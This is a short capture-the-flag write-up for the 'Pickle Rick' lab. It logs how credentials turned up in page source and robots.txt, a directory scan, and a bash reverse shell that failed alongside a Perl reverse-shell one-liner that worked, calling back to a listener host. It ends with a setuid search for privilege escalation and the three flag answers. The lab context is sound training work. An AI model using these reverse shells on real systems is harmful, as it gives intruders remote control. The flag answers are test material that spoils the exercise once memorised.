# Pickle Rick

```
exploit webserver
```

## Notes

```

10.10.140.140

comment in source
<!--
    Note to self, remember username!
    Username: R1ckRul3s
-->

Nmap results:
22, 80 open

Dirsearch results:
[20:12:48] 301 -  315B  - /assets  ->  http://10.10.140.140/assets/                                      │
[20:13:26] 200 -    1KB - /index.html                                                                    │
[20:13:35] 200 -  882B  - /login.php                                                                     │
[20:14:03] 200 -   17B  - /robots.txt

robots.txt
Wubbalubbadubdub

Credentials:
R1ckRul3s:Wubbalubbadubdub

Inspect after login:(What is this)
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==

/clue.txt => Look around the file system for the other ingredient.

// Useless stuff
/usr/lib/python3.5/idlelib/TODO.txt
/usr/lib/python3.5/idlelib/HISTORY.txt
/usr/lib/python3.5/idlelib/CREDITS.txt
/usr/lib/python3.5/idlelib/help.txt
/usr/lib/python3.5/idlelib/extend.txt
/usr/lib/python3.5/idlelib/README.txt
/usr/lib/python3.5/idlelib/NEWS.txt

echo $ENV
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

less command to read file

Reverse shell:
    bash -i >& /dev/tcp/10.9.18.129/9000 0>&1   => DOESN'T WORK

    // THIS WORKS!!!
    perl -e 'use Socket;$i="10.9.18.129";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Questions

1. What is the first ingredient Rick needs?

```
Command: ls
/Sup3rS3cretPickl3Ingred.txt

mr. meeseek hair
```

2. Whats the second ingredient Rick needs?

```
perl shell
cd /home/rick/

1 jerry tear

```

3. Whats the final ingredient Rick needs?

```
list all setuid binaries -> find / -per 4000 2>/dev/null
search gtfobins for prevesc on /bin/mount

fleeb juice
```
